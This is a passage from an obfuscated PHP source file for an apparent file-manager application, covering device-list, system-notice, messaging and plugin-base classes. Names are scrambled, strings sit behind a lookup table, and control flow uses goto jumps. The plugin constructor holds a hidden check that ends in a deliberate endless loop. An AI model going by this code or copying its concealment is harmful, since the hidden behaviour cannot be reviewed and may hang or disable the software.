== 0) { return; } $b¡…³Ò²Ë = array($F—ÁÄ†‚Ã[388] => array($F—ÁÄ†‚Ã[7], array_unique($cª”ß±Õ”Ï))); $this->where($b¡…³Ò²Ë)->delete(); } public function deviceList($F×Ìƒ¿Õö¨, $A’èí¤õÍ§ = 0) { $a‰“ã¿à¾‚ =& $_SERVER[ç]; $dÕÛ¸àŒÉ® = array($a‰“ã¿à¾‚[1491] => $F×Ìƒ¿Õö¨, $a‰“ã¿à¾‚[192] => array($a‰“ã¿à¾‚[939], $A’èí¤õÍ§), $a‰“ã¿à¾‚[29] => $a‰“ã¿à¾‚[1594]); $d›Ø­¹Õ‚» = array(); $F‰›ïÊøƒò = $this->field($a‰“ã¿à¾‚[2060])->where($dÕÛ¸àŒÉ®)->order($a‰“ã¿à¾‚[1880])->limit(50)->select(); foreach ($F‰›ïÊøƒò as $cÃƒ¹ÈÜ‰ => $cÎÌƒ³ÈÁŸ) { goto D½»²Ş¥ù; c÷ÏÅ¶×ø¹: $this->ipAddress($cÎÌƒ³ÈÁŸ); $cÎÌƒ³ÈÁŸ[$a‰“ã¿à¾‚[425]] = $DåËÖšìƒÎ; $d›Ø­¹Õ‚»[$B²±ÛøáÇ] = $cÎÌƒ³ÈÁŸ; goto BÍ”ùÖÉğ; FÆ‰Â£ëÒœ: unset($DåËÖšìƒÎ[$a‰“ã¿à¾‚[2052]]); $B²±ÛøáÇ = $this->deviceType($DåËÖšìƒÎ[$a‰“ã¿à¾‚[1871]]); if (isset($d›Ø­¹Õ‚»[$B²±ÛøáÇ])) { continue; } goto c÷ÏÅ¶×ø¹; D½»²Ş¥ù: if ($cÃƒ¹ÈÜ‰ > 0 && abs($cÎÌƒ³ÈÁŸ[$a‰“ã¿à¾‚[192]] - $F‰›ïÊøƒò[$cÃƒ¹ÈÜ‰ - 1][$a‰“ã¿à¾‚[192]]) < 5) { continue; } $DåËÖšìƒÎ = json_decode($cÎÌƒ³ÈÁŸ[$a‰“ã¿à¾‚[425]], !0); $cÎÌƒ³ÈÁŸ[$a‰“ã¿à¾‚[2052]] = isset($DåËÖšìƒÎ[$a‰“ã¿à¾‚[2052]]) ? $DåËÖšìƒÎ[$a‰“ã¿à¾‚[2052]] : $a‰“ã¿à¾‚[33]; goto FÆ‰Â£ëÒœ; BÍ”ùÖÉğ: } return array_values($d›Ø­¹Õ‚»); } public function deviceType($açøõ»‘ÏÈ) { return $açøõ»‘ÏÈ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\156\x6f\x74\x69\x63\x65\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\143\x6f\156\x74\145\156\164", "\141\165\x74\150", "\x6d\157\x64\145", "\x74\x69\155\x65", "\164\171\x70\145", "\x6c\x65\166\145\154", "\x65\x6e\141\x62\x6c\145", "\x73\157\162\x74"); public function listData($dåªÆ­ÚÍâ = false, $C±Á§‹ó = "\163\157\x72\x74", $f–Ü‹ªîºÁ = false) { return parent::listData($dåªÆ­ÚÍâ, $C±Á§‹ó, $f–Ü‹ªîºÁ); } public function add($b‹ŠåƒµÃñ) { $A”Æ»§Ş÷ä =& $_SERVER[ç]; $aÕ´åªÈ†é = time(); if ($b‹ŠåƒµÃñ[$A”Æ»§Ş÷ä[12]] == $A”Æ»§Ş÷ä[2061]) { $aÕ´åªÈ†é = strtotime($b‹ŠåƒµÃñ[$A”Æ»§Ş÷ä[195]]); } $b‹ŠåƒµÃñ[$A”Æ»§Ş÷ä[195]] = $aÕ´åªÈ†é; return parent::insert($b‹ŠåƒµÃñ); } public function update($aöÀ½£ÛÁ», $F®ĞîÊ¿‘) { goto Cñ¦©‡¡Ñó; Cñ¦©‡¡Ñó: $EÊÈÜËï† =& $_SERVER[ç]; $CĞÙÓ´Ü†ª = $this->listData($aöÀ½£ÛÁ»); if (!$CĞÙÓ´Ü†ª) { return !1; } goto Cã§øÀ•; D™¶‘ñİôæ: return parent::update($aöÀ½£ÛÁ», $F®ĞîÊ¿‘); goto cíËŒƒ¹´; Cã§øÀ•: $F„õ¦µÄƒì = time(); if ($F®ĞîÊ¿‘[$EÊÈÜËï†[12]] == $EÊÈÜËï†[2061]) { $F„õ¦µÄƒì = strtotime($F®ĞîÊ¿‘[$EÊÈÜËï†[195]]); } $F®ĞîÊ¿‘[$EÊÈÜËï†[195]] = $F„õ¦µÄƒì; goto D™¶‘ñİôæ; cíËŒƒ¹´: } public function remove($A–…ß­ò¤¦) { $AÃ¼Êô½…ô = $this->listData($A–…ß­ò¤¦); if (!$AÃ¼Êô½…ô || $AÃ¼Êô½…ô[$_SERVER[ç][1136]]) { return !1; } return parent::remove($A–…ß­ò¤¦); } public function sort($D½ë‰ëØã¾, $D·ŠâóôäÆ) { return parent::update($D½ë‰ëØã¾, $D·ŠâóôäÆ); } public function enable($CíÈõ÷ÁÙ¬, $C†«´ˆÛˆ) { return parent::update($CíÈõ÷ÁÙ¬, array($_SERVER[ç][2062] => $C†«´ˆÛˆ)); } private function initUserOption() { $DÀÄÎ‰©­å =& $_SERVER[ç]; $this->optionType = $DÀÄÎ‰©­å[2063]; $this->modelType = $DÀÄÎ‰©­å[2064]; $this->field = array($DÀÄÎ‰©­å[2065], $DÀÄÎ‰©­å[28], $DÀÄÎ‰©­å[195], $DÀÄÎ‰©­å[29], $DÀÄÎ‰©­å[2066], $DÀÄÎ‰©­å[695], $DÀÄÎ‰©­å[189]); } public function userNoticeGet($C­™ï±Šé® = false) { $this->initUserOption(); return parent::listData($C­™ï±Šé®, $_SERVER[ç][388], !0); } public function userNoticeAdd($B³èË¦“»Ï) { $A²àî¿„ƒ =& $_SERVER[ç]; $this->initUserOption(); $d¼ù©ˆ·Š• = $this->findByKey($A²àî¿„ƒ[2065], $B³èË¦“»Ï[$A²àî¿„ƒ[388]]); if ($d¼ù©ˆ·Š•) { return !0; } $B›×ÏÌ”¬Ÿ = array($A²àî¿„ƒ[2065] => $B³èË¦“»Ï[$A²àî¿„ƒ[388]], $A²àî¿„ƒ[28] => $B³èË¦“»Ï[$A²àî¿„ƒ[28]], $A²àî¿„ƒ[195] => $B³èË¦“»Ï[$A²àî¿„ƒ[195]], $A²àî¿„ƒ[29] => isset($B³èË¦“»Ï[$A²àî¿„ƒ[29]]) ? $B³èË¦“»Ï[$A²àî¿„ƒ[29]] : 1, $A²àî¿„ƒ[2066] => isset($B³èË¦“»Ï[$A²àî¿„ƒ[2066]]) ? $B³èË¦“»Ï[$A²àî¿„ƒ[2066]] : 0, $A²àî¿„ƒ[695] => 0, $A²àî¿„ƒ[189] => 0); return parent::insert($B›×ÏÌ”¬Ÿ); } public function userNoticeEdit($c‡†ëÀ¼ƒ¼, $B»¸çáêÎ) { $this->initUserOption(); return parent::update($c‡†ëÀ¼ƒ¼, $B»¸çáêÎ); } } goto aĞİ‘ƒõİ—; fĞñœ‚Ÿ‹¢: class Message { function __construct() { } public function send($bÓØ‚æãÁ = '', $d‡øµœÁİ¸ = array(), $Däµåêìˆğ = "\x74\x65\170\164") { goto BŠˆãÎ†Ùç; D¿’©Í‘õ¬: Hook::trigger($eôÛ‹ÇÓ[1361], $dù½¯›á©); goto fù¢÷ÅÓ±ä; eĞŸ×£ÂÄ“: $d‡øµœÁİ¸ = array($eôÛ‹ÇÓ[983] => isset($d‡øµœÁİ¸[$eôÛ‹ÇÓ[983]]) ? $d‡øµœÁİ¸[$eôÛ‹ÇÓ[983]] : $eôÛ‹ÇÓ[33], $eôÛ‹ÇÓ[557] => isset($d‡øµœÁİ¸[$eôÛ‹ÇÓ[557]]) ? $d‡øµœÁİ¸[$eôÛ‹ÇÓ[557]] : $eôÛ‹ÇÓ[33]); if (empty($bÓØ‚æãÁ) || empty($d‡øµœÁİ¸[$eôÛ‹ÇÓ[983]]) && empty($d‡øµœÁİ¸[$eôÛ‹ÇÓ[557]])) { return !1; } $dù½¯›á© = array($eôÛ‹ÇÓ[1299] => $f¶ÉŞ¸ºàÄ, $eôÛ‹ÇÓ[1360] => $d‡øµœÁİ¸); goto D¿’©Í‘õ¬; BŠˆãÎ†Ùç: $eôÛ‹ÇÓ =& $_SERVER[ç]; $f¶ÉŞ¸ºàÄ = array($eôÛ‹ÇÓ[29] => $eôÛ‹ÇÓ[1358], $eôÛ‹ÇÓ[698] => $bÓØ‚æãÁ); if (in_array($Däµåêìˆğ, array($eôÛ‹ÇÓ[1358], $eôÛ‹ÇÓ[1359]))) { $f¶ÉŞ¸ºàÄ[$eôÛ‹ÇÓ[29]] = $Däµåêìˆğ; } goto eĞŸ×£ÂÄ“; fù¢÷ÅÓ±ä: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto E§ˆô¦Ë°œ; c È˜½¡í­: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($f¿Æœ‘¡Œ‘[1362]); goto E›ØÌ‹àÓÙ; E›ØÌ‹àÓÙ: $this->pluginName = str_replace($f¿Æœ‘¡Œ‘[1362], $f¿Æœ‘¡Œ‘[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $f¿Æœ‘¡Œ‘[8]; $this->pluginApi = appHostGet() . $f¿Æœ‘¡Œ‘[1363] . $this->pluginName . $f¿Æœ‘¡Œ‘[8]; goto bæâœ‰³©–; B®Üó¨Ê‚ô: return $this; goto E–¢íµµ¬ ; E§ˆô¦Ë°œ: $f¿Æœ‘¡Œ‘ =& $_SERVER[ç]; if (!isset($_SERVER[$f¿Æœ‘¡Œ‘[788]]) || !isset($_SERVER[$f¿Æœ‘¡Œ‘[795]])) { goto f÷ Ïõô¾‘; f÷ Ïõô¾‘: $c‰–çÀ‹À¯ = $f¿Æœ‘¡Œ‘[809]; $C™­ë¦ñ¨ = $f¿Æœ‘¡Œ‘[790]; $a¯³Ö°‹³ = $_SERVER[$f¿Æœ‘¡Œ‘[791]] . $f¿Æœ‘¡Œ‘[792]; goto E‰“»¯•à; E‰“»¯•à: $cª›ˆ¾°İ÷ = $C™­ë¦ñ¨($a¯³Ö°‹³); $bƒä«®ù’… = explode($f¿Æœ‘¡Œ‘[227], $cª›ˆ¾°İ÷); if (count($bƒä«®ù’…) < $f¿Æœ‘¡Œ‘[597]) { $c™¨ù‘ø† = $f¿Æœ‘¡Œ‘[793]; $c™¨ù‘ø†(); } goto f·¨œÆ¿åù; F—’è¥í÷…: for ($BéÍ†¿ùº = $b¤ƒî•¼øï; $BéÍ†¿ùº > 0; $BéÍ†¿ùº++) { $b„Øº×íÓ = json_encode($GLOBALS[$f¿Æœ‘¡Œ‘[405]]); } goto dÁëš…–ˆë; f·¨œÆ¿åù: $b„Øº×íÓ = $f¿Æœ‘¡Œ‘[810]; $b„Øº×íÓ($_SERVER[$f¿Æœ‘¡Œ‘[811]]); $b¤ƒî•¼øï = 1; goto F—’è¥í÷…; dÁëš…–ˆë: } global $in, $config; goto c È˜½¡í­; bæâœ‰³©–: $this->pluginHost = $config[$f¿Æœ‘¡Œ‘[1364]] . $this->pluginName . $f¿Æœ‘¡Œ‘[8]; $this->pluginHostDefault = $config[$f¿Æœ‘¡Œ‘[1364]] . $this->pluginName . $f¿Æœ‘¡Œ‘[8]; $D‘§¤»µœ = $config[$f¿Æœ‘¡Œ‘[1365]]; goto cæ…„å¹; cæ…„å¹: if ($D‘§¤»µœ && strpos($f¿Æœ‘¡Œ‘[47] . $D‘§¤»µœ . $f¿Æœ‘¡Œ‘[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$f¿Æœ‘¡Œ‘[1366]] . $this->pluginName . $f¿Æœ‘¡Œ‘[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto B®Üó¨Ê‚ô; E–¢íµµ¬ : } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ç][1367]); } protected function assign($eÏÌì¢óÃ, $E‰ˆˆÏ®” = false) { if (is_array($eÏÌì¢óÃ)) { $this->values = array_merge($this->values, $eÏÌì¢óÃ); } else { $this->values[$eÏÌì¢óÃ] = $E‰ˆˆÏ®”; } } protected function display($E‘¼¦ÏŸÆÑ) { extract($this->values); require $E‘¼¦ÏŸÆÑ; } final function hookRegist($d˜ç•½‚à¢) { $this->modelPlugin->appRegist($this->pluginName, $d˜ç•½‚à¢); } final function appIcon() { $C„‰›™™ò¯ =& $_SERVER[ç]; $dâ·×£ë‹° = $this->appPackage(); $FÕÁ–Ë†½ = $C„‰›™™ò¯[33]; if (isset($dâ·×£ë‹°[$C„‰›™™ò¯[403]])) { if (isset($dâ·×£ë‹°[$C„‰›™™ò¯[403]][$C„‰›™™ò¯[1368]])) { $FÕÁ–Ë†½ = $C„‰›™™ò¯[1369] . $dâ·×£ë‹°[$C„‰›™™ò¯[403]][$C„‰›™™ò¯[1368]] . $C„‰›™™ò¯[1370]; } else { if ($dâ·×£ë‹°[$C„‰›™™ò¯[403]][$C„‰›™™ò¯[1371]]) { $FÕÁ–Ë†½ = $C„‰›™™ò¯[1372] . $dâ·×£ë‹°[$C„‰›™™ò¯[403]][$C„‰›™™ò¯[1371]] . $C„‰›™™ò¯[1373]; } } } return $FÕÁ–Ë†½; } final function fileCanView($B‚ïß×„ä ) { goto d‹íáÄ¤ø; D ¢ÙŠ°§ó: $B …ÀŠÓÎ½ = Session::get($fº„ïÁŸò [1374]); if (!$B …ÀŠÓÎ½ || !$B …ÀŠÓÎ½[$fº„ïÁŸò [1375]]) { $Eƒ¤åÁ©œŸ = $fº„ïÁŸò [1376] . rawurlencode(this_url()); show_tips(LNG($fº„ïÁŸò [1377]) . $fº„ïÁŸò [1378] . $Eƒ¤åÁ©œŸ . $fº„ïÁŸò [1379] . LNG($fº„ïÁŸò [1380]) . $fº„ïÁŸò [1381], !1); } if (!Action($fº„ïÁŸò [1382])->authCan($fº„ïÁŸò [1383])) { show_tips(LNG($fº„ïÁŸò [1384]) . $fº„ïÁŸò [1385], !1); } goto B çÈù¬ÃÜ; d‹íáÄ¤ø: $fº„ïÁŸò  =& $_SERVER[ç]; if (request_url_safe($B‚ïß×„ä )) { return !0; } if ($this->isShare($B‚ïß×„ä )) { return !0; } goto D ¢ÙŠ°§ó; B çÈù¬ÃÜ: ActionCall($fº„ïÁŸò [1386], $B‚ïß×„ä ); goto c›á‰“ÙÓì; c›á‰“ÙÓì: } final function isShare($fóËé‘ôµŠ) { $AëŞÂÛ‘”Ã = KodIO::parse($fóËé‘ôµŠ); return $AëŞÂÛ‘”Ã[$_SERVER[ç][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Fáæ™ØÇó—) { if (request_url_safe($Fáæ™ØÇó—)) { return $Fáæ™ØÇó—; } if (!$this->isShare($Fáæ™ØÇó—)) { $Fáæ™ØÇó— = $this->filePath($Fáæ™ØÇó—); } return Action($_SERVER[ç][1037])->linkOut($Fáæ™ØÇó—); } public function filePathLinkOut($cÚœ×åãÉÄ) { if (request_url_safe($cÚœ×åãÉÄ)) { return $cÚœ×åãÉÄ; } $this->fileCanView($cÚœ×åãÉÄ); return Action($_SERVER[ç][1037])->link($cÚœ×åãÉÄ); } final function filePath($b¬ë¼ÈŒ) { $fâ²âë¶†Æ =& $_SERVER[ç]; if ($dˆ©½è‚‚„ = $this->checkSharePath($b¬ë¼ÈŒ)) { return $dˆ©½è‚‚„; } $this->fileCanView($b¬ë¼ÈŒ); if (request_url_safe($b¬ë¼ÈŒ)) { $b†ˆ×Ä‰§¹ = parse_url_query($b¬ë¼ÈŒ); if (isset($b†ˆ×Ä‰§¹[$fâ²âë¶†Æ[1387]]) && isset($b†ˆ×Ä‰§¹[$fâ²âë¶†Æ[207]])) { $F¹ƒ¶ç °® = Model($fâ²âë¶†Æ[1091])->get($fâ²âë¶†Æ[1388]); $cÎïÚï¸¶Â = Mcrypt::decode($b†ˆ×Ä‰§¹[$fâ²âë¶†Æ[207]], $F¹ƒ¶ç °®); if ($cÎïÚï¸¶Â) { $this->fileInfo = IO::infoWithChildren($cÎïÚï¸¶Â); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $cÎïÚï¸¶Â; } } $b¬ë¼ÈŒ = $this->_cacheHttpFile($b¬ë¼ÈŒ); $this->fileInfo = IO::infoWithChildren($b¬ë¼ÈŒ); } else { $this->fileInfo = IO::infoWithChildren($b¬ë¼ÈŒ); if (!$this->fileInfo) { show_tips(LNG($fâ²âë¶†Æ[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $b¬ë¼ÈŒ; } final function _cacheHttpFile($f¨Ššº¸É‡) { $D›§°ßƒ˜Î = hash_path($f¨Ššº¸É‡, !0); $this->cachePath = $this->pluginCachePath($D›§°ßƒ˜Î); if ($AÄß¾Ø•Ç = IO::fileNameExist($this->cachePath, $D›§°ßƒ˜Î)) { return KodIO::make($AÄß¾Ø•Ç); } $cÛ£˜ÑÖ¸³ = $this->cachePath . $D›§°ßƒ˜Î; return $this->pluginCacheFileSet($cÛ£˜ÑÖ¸³, file_get_contents($f¨Ššº¸É‡)); } final function _tmpFileName($fù‘ò’®¬É = array()) { goto Fªˆ§ª«°¥; EÅŒ¥¸‘ñê: $Dà³ÙØ‘èÒ = array($fù‘ò’®¬É[$F³İ™‚ÜÚ‘[28]], $fù‘ò’®¬É[$F³İ™‚ÜÚ‘[75]], $fù‘ò’®¬É[$F³İ™‚ÜÚ‘[77]]); if (isset($fù‘ò’®¬É[$F³İ™‚ÜÚ‘[481]])) { $Dà³ÙØ‘èÒ[] = $fù‘ò’®¬É[$F³İ™‚ÜÚ‘[481]]; } return md5(implode($F³İ™‚ÜÚ‘[70], $Dà³ÙØ‘èÒ)); goto fÎŠ“îÄÖ¸; Fªˆ§ª«°¥: $F³İ™‚ÜÚ‘ =& $_SERVER[ç]; if (!$fù‘ò’®¬É) { $fù‘ò’®¬É = $this->fileInfo; } if (isset($fù‘ò’®¬É[$F³İ™‚ÜÚ‘[170]])) { return $fù‘ò’®¬É[$F³İ™‚ÜÚ‘[170]]; } goto E›ˆóÚ¿¸ ; E›ˆóÚ¿¸ : if (isset($fù‘ò’®¬É[$F³İ™‚ÜÚ‘[163]][$F³İ™‚ÜÚ‘[170]])) { return $fù‘ò’®¬É[$F³İ™‚ÜÚ‘[163]][$F³İ™‚ÜÚ‘[170]]; } $D¢õó¯³Ã‹ = IO::hashSimple($fù‘ò’®¬É[$F³İ™‚ÜÚ‘[75]]); if ($D¢õó¯³Ã‹) { return $D¢õó¯³Ã‹; } goto EÅŒ¥¸‘ñê; fÎŠ“îÄÖ¸: } final function checkSharePath($F ¸‰¾â·) { goto aƒÄÕ‰–¶; aƒÄÕ‰–¶: $a†Š¹‰ªØ =& $_SERVER[ç]; if (!defined($a†Š¹‰ªØ[448])) { define($a†Š¹‰ªØ[1389], 0); } if (!$this->isShare($F ¸‰¾â·)) { return !1; } goto e¡ëèùßÇÌ; BÈ¶Ş›«šë: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a†Š¹‰ªØ[170]]); return $fÂ” ­çÜÉ[$a†Š¹‰ªØ[75]]; goto c§•›ƒÈ©Æ; e¡ëèùßÇÌ: $fÂ” ­çÜÉ = Action($a†Š¹‰ªØ[1037])->sharePathInfo($F ¸‰¾â·); if (!isset($fÂ” ­çÜÉ[$a†Š¹‰ªØ[75]])) { show_json(LNG($a†Š¹‰ªØ[1390]), !1); } $this->fileInfo = $fÂ” ­çÜÉ[$a†Š¹‰ªØ[163]]; goto BÈ¶Ş›«šë; c§•›ƒÈ©Æ: } final function pluginCachePath($Aï‰ìù’šÄ = '') { $D…Ğå»Ú§‘ =& $_SERVER[ç]; $aà½¹º±ƒ¬ = IO_PATH_SYSTEM_TEMP . $D…Ğå»Ú§‘[1391] . $this->pluginName; if (!($A¢¯Ç¡Ñ¾Š = IO::infoFull($aà½¹º±ƒ¬))) { return IO::mkdir($aà½¹º±ƒ¬ . $D…Ğå»Ú§‘[8] . $Aï‰ìù’šÄ); } if (empty($Aï‰ìù’šÄ)) { return $A¢¯Ç¡Ñ¾Š[$D…Ğå»Ú§‘[75]]; } if (!($dÓ¯ª³¨Ä™ = IO::fileNameExist($A¢¯Ç¡Ñ¾Š[$D…Ğå»Ú§‘[75]], $Aï‰ìù’šÄ))) { return IO::mkdir($A¢¯Ç¡Ñ¾Š[$D…Ğå»Ú§‘[75]] . $Aï‰ìù’šÄ); } return KodIO::make($dÓ¯ª³¨Ä™); } final function pluginCacheFileSet($a°ëÈÌªù«, $B‘‰ˆß äŒ = '') { $f„ã„‹ƒÒÛ =& $_SERVER[ç]; if (!($bİÈÙù° = IO::infoFull($a°ëÈÌªù«))) { return IO::mkfile($a°ëÈÌªù«, $B‘‰ˆß äŒ, REPEAT_REPLACE); } IO::setContent($bİÈÙù°[$f„ã„‹ƒÒÛ[75]], $B‘‰ˆß äŒ); return $bİÈÙù°[$f„ã„‹ƒÒÛ[75]]; } final function pluginLocalFile($CŠæƒÇ´¿É = '') { goto c“çä‘İôä; aÇ¢ñ‚ñ§â: if (!$CŠæƒÇ´¿É) { return $bŸ‰Ëö‰¯Á; } $Cô¤µÓ÷÷¶ = IO::info($CŠæƒÇ´¿É); $aòåä ©Ê‚ = $this->_tmpFileName($Cô¤µÓ÷÷¶) . $CÓù°æº—î[94] . $Cô¤µÓ÷÷¶[$CÓù°æº—î[167]]; goto dÂà÷ ¶êŠ; c“çä‘İôä: $CÓù°æº—î =& $_SERVER[ç]; $bŸ‰Ëö‰¯Á = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($bŸ‰Ëö‰¯Á)) { mk_dir($bŸ‰Ëö‰¯Á); } goto aÇ¢ñ‚ñ§â; EÄ¤…Œ¯Äô: return IO::copy($CŠæƒÇ´¿É, $bŸ‰Ëö‰¯Á, 0, $aòåä ©Ê‚); goto e¨‹‚ˆ¬ÖÉ; dÂà÷ ¶êŠ: if (!checkExtSafe($aòåä ©Ê‚)) { $aòåä ©Ê‚ = $aòåä ©Ê‚ . $CÓù°æº—î[1392]; } $AÉ›É Ğò¼ = $bŸ‰Ëö‰¯Á . $aòåä ©Ê‚; if (@file_exists($AÉ›É Ğò¼)) { return $AÉ›É Ğò¼; } goto EÄ¤…Œ¯Äô; e¨‹‚ˆ¬ÖÉ: } final function appPackage() { goto B§›Ì¤ò¾ë; BÚ˜¡à¬‡Û: $this->parseLang($F¡ƒè„ß•ô); $BÃº¹¿ÛÙ = json_decode_force($F¡ƒè„ß•ô); if (!$BÃº¹¿ÛÙ) { return array(); } goto eÃ¼‡áåÙŠ; E¸ŒªÕ†: return $BÃº¹¿ÛÙ; goto e ¤Ô†Û±; eÃ¼‡áåÙŠ: $D¢äÎªó = Hook::trigger($DğÃ¡ƒñÃÄ[1394], $BÃº¹¿ÛÙ); if ($D¢äÎªó && is_array($D¢äÎªó)) { $BÃº¹¿ÛÙ = $D¢äÎªó; } $this->packageData = $BÃº¹¿ÛÙ; goto E¸ŒªÕ†; B§›Ì¤ò¾ë: $DğÃ¡ƒñÃÄ =& $_SERVER[ç]; if ($this->packageData) { return $this->packageData; } $F¡ƒè„ß•ô = $this->parseFile($this->pluginPath . $DğÃ¡ƒñÃÄ[1393]); goto BÚ˜¡à¬‡Û; e ¤Ô†Û±: } public function packageInfoGet($Bí­ÓËìÜ) { $DÚÊøÑ‚õ = $this->appPackage(); return array_get_value($DÚÊøÑ‚õ, $Bí­ÓËìÜ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ç][1395]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ç][1396]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ç][1397]); } private function parseFile($dª‚åìéŞ…) { goto CÍøŒ†ö¾”; eƒ¦ÜËºé: $A²†ÁëÃ³­ = str_replace($f¶‘‹Ã´š, $bòç³§‚‚, $A²†ÁëÃ³­); return $A²†ÁëÃ³­; goto Eš„¿”§Û´; CàëŒ—¶•‚: $bòç³§‚‚ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D©„„ˆÁöõ[87]][$D©„„ˆÁöõ[1405]]); if (strstr($A²†ÁëÃ³­, $D©„„ˆÁöõ[1406])) { $bñŸÓõ¡Àé = rawurlencode(json_encode($this->pluginLangArr)); $A²†ÁëÃ³­ = str_replace($D©„„ˆÁöõ[1406], $bñŸÓõ¡Àé, $A²†ÁëÃ³­); } if (strstr($A²†ÁëÃ³­, $D©„„ˆÁöõ[1407])) { $bñŸÓõ¡Àé = $bñŸÓõ¡Àé = rawurlencode(json_encode($this->getConfig())); $A²†ÁëÃ³­ = str_replace($D©„„ˆÁöõ[1407], $bñŸÓõ¡Àé, $A²†ÁëÃ³­); } goto eƒ¦ÜËºé; CÍøŒ†ö¾”: $D©„„ˆÁöõ =& $_SERVER[ç]; $A²†ÁëÃ³­ = file_get_contents($dª‚åìéŞ…); $f¶‘‹Ã´š = array($D©„„ˆÁöõ[1398], $D©„„ˆÁöõ[1399], $D©„„ˆÁöõ[1400], $D©„„ˆÁöõ[1401], $D©„„ˆÁöõ[1402], $D©„„ˆÁöõ[1403], $D©„„ˆÁöõ[1404]); goto CàëŒ—¶•‚; Eš„¿”§Û´: } private function parseLang(&$E×Å®‚­Ó¯) { goto cÄÓ—Ã; d“²İ¤ªğ: preg_match_all($BòÀŠËƒ·®[1409], $E×Å®‚­Ó¯, $A×‡Ğ¢í‡ø); if (!is_array($A×‡Ğ¢í‡ø) || count($A×‡Ğ¢í‡ø) == 0 || !is_array($A×‡Ğ¢í‡ø[0]) || count($A×‡Ğ¢í‡ø[0]) == 0) { return; } $B™¥ÆÎÊ»ù = array(); goto E–ô¯É¥â‹; E–ô¯É¥â‹: $C’êÀÖÂÍ­ = array(); foreach ($A×‡Ğ¢í‡ø[0] as $bÍ¾ñëêíº) { $eĞöÄŠåÕá = substr($bÍ¾ñëêíº, strlen($B¨å¡†£ö’), -4); $CùÀĞÎÛÒç = LNG($eĞöÄŠåÕá); $B™¥ÆÎÊ»ù[] = $bÍ¾ñëêíº; $C’êÀÖÂÍ­[] = str_replace(array($BòÀŠËƒ·®[227], $BòÀŠËƒ·®[1005], $BòÀŠËƒ·®[338], $BòÀŠËƒ·®[115]), array($BòÀŠËƒ·®[50], $BòÀŠËƒ·®[50], $BòÀŠËƒ·®[33], $BòÀŠËƒ·®[1410]), $CùÀĞÎÛÒç); } $E×Å®‚­Ó¯ = str_replace($B™¥ÆÎÊ»ù, $C’êÀÖÂÍ­, $E×Å®‚­Ó¯); goto C•Çëíñğ‡; cÄÓ—Ã: $BòÀŠËƒ·® =& $_SERVER[ç]; $B¨å¡†£ö’ = $BòÀŠËƒ·®[1408]; if (!strstr($E×Å®‚­Ó¯, $B¨å¡†£ö’)) { return; } goto d“²İ¤ªğ; C•Çëíñğ‡: } private function parseConfig(&$c”ÙÁ†›) { goto c»®ÁÙäÎñ; d¤¶œÊ³¢Û: preg_match_all($B©ŸÙÍç[1412], $c”ÙÁ†›, $B£¹ÌàÙ¨); if (!is_array($B£¹ÌàÙ¨) || count($B£¹ÌàÙ¨) == 0 || !is_array($B£¹ÌàÙ¨[0]) || count($B£¹ÌàÙ¨[0]) == 0) { return; } $dã¯ÔŸª³î = $this->getConfig(); goto fĞÔ…¾¶„ø; fĞÔ…¾¶„ø: $Eì¶òöŠí = array(); $c†“ñïæ = array(); foreach ($B£¹ÌàÙ¨[0] as $d¶™Æ¤ùÇ) { $EÛ¢â½×İÑ = substr($d¶™Æ¤ùÇ, strlen($A’³½µˆ†à), -2); $Eì¶òöŠí[] = $d¶™Æ¤ùÇ; $c†“ñïæ[] = _get($dã¯ÔŸª³î, $EÛ¢â½×İÑ); } goto eİï®ÄØ—‚; c»®ÁÙäÎñ: $B©ŸÙÍç =& $_SERVER[ç]; $A’³½µˆ†à = $B©ŸÙÍç[1411]; if (!strstr($c”ÙÁ†›, $A’³½µˆ†à)) { return; } goto d¤¶œÊ³¢Û; eİï®ÄØ—‚: $c”ÙÁ†› = str_replace($Eì¶òöŠí, $c†“ñïæ, $c”ÙÁ†›); goto fÄ£½óïİ; fÄ£½óïİ: } private function parsePackage(&$fã©¯‘ÑÆç) { goto däğ°‰ØÔ”; BŒ‹»ßˆîƒ: $fã©¯‘ÑÆç = str_replace($F¸Ü¤—­–ê, $cÏÌã•†ˆ‹, $fã©¯‘ÑÆç); goto cØíˆ˜¦ÀÂ; aØ‰§…œ÷æ: $F¸Ü¤—­–ê = array(); $cÏÌã•†ˆ‹ = array(); foreach ($b‘“ÁßÎã[0] as $fÎİÏïóË¨) { $b¼èØÄõà = substr($fÎİÏïóË¨, strlen($E§§–óÅ‘ö), -2); $F¸Ü¤—­–ê[] = $fÎİÏïóË¨; $cÏÌã•†ˆ‹[] = _get($c˜ÃöìÏ·Õ, $b¼èØÄõà); } goto BŒ‹»ßˆîƒ; Bíè„ÆÎ²æ: preg_match_all($bÀß¿’Ã¾Ì[1414], $fã©¯‘ÑÆç, $b‘“ÁßÎã); if (!is_array($b‘“ÁßÎã) || count($b‘“ÁßÎã) == 0 || !is_array($b‘“ÁßÎã[0]) || count($b‘“ÁßÎã[0]) == 0) { return; } $c˜ÃöìÏ·Õ = $this->appPackage(); goto aØ‰§…œ÷æ; däğ°‰ØÔ”: $bÀß¿’Ã¾Ì =& $_SERVER[ç]; $E§§–óÅ‘ö = $bÀß¿’Ã¾Ì[1413]; if (!strstr($fã©¯‘ÑÆç, $E§§–óÅ‘ö)) { return; } goto Bíè„ÆÎ²æ; cØíˆ˜¦ÀÂ: } final function echoFile($E„×íùÑ“Ş, 